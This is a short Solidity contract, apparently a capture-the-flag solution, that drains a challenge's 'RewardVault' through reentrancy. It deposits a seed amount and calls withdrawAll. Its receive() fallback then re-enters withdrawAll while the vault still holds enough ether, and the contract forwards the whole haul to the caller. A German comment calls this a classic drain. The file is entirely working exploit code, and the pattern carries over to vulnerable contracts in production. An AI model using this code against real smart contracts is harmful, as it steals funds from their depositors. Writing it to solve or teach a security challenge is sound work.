// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "./Challenge.sol";

contract Solution {
    RewardVault private vault;
    address private player;

    uint256 private seed;
    bool private attacking;

    function solve(Setup setup) external payable {
        player = msg.sender;
        vault = setup.vault();
        seed = msg.value;

        require(seed > 0, "need seed");

        vault.deposit{value: seed}();

        attacking = true;
        vault.withdrawAll();
        attacking = false;

        (bool ok,) = payable(player).call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    receive() external payable {
        if (!attacking) return;

        // klassischer drain: nur re-entern solange die Vault noch mind. seed auszahlen kann
        if (address(vault).balance >= seed) {
            vault.withdrawAll();
        }
    }
}